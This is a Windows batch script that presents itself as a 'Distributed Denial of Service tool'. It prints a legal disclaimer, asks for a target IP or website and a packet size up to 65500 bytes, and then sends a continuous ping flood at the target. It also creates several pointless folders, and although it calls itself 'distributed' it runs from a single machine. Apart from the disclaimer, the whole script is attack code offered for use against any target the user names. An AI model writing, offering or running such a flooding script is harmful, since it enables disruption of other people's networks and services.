@echo off
title Distributed Denial of Service tool
color 0B

rem | a warning

echo Distributed Denial of Service (DDoS) attacks are illegal and can cause serious harm to websites and networks.
echo Using this script to perform a DDoS attack is strictly prohibited and can result in severe legal consequences.
echo This script is for educational purposes only. Do not use it for any malicious activity.
echo By using this, you acknowledge that you understand and accept the risks and consequences associated with DDoS attacks.
echo Author of this program does not take any responsibility for creating malicious attack by using this program.
timeout 4 /nobreak > nul
pause
cls
md run
cls
echo internet check
timeout 2 /nobreak > nul
ping 8.8.8.8 -l 128 -n 1
timeout 1 /nobreak > nul
md internet
cls

rem | checks if you have internet connection by pinging google's DNS (8.8.8.8) with 128 bytes

cls
echo Loading...
timeout 1 /nobreak > nul
cls
md files
cls
echo put an ip, address or website to send ddos.
echo the program will automatically convert it to an ip.
set /p ip=ip:
md ip
cls

echo enter your packet size [1 to 65500]
echo if your requests are getting timed out try setting this to something smaller.
set /p size=size (in bytes):
md packet
cls

:start
color 04

rem | confirmation

echo start attack
pause
cls
echo click ctrl+c to stop.
timeout 2 /nobreak > nul
md attack
cls

title DDoS: Program running, %ip% %size% bytes, ctrl+c to stop.
md start
cls
echo program start
echo time: %time%

rem | displays your current time

ping -t -l %size% %ip%

echo time: %time%

echo program end
timeout 4 /nobreak > nul
exit
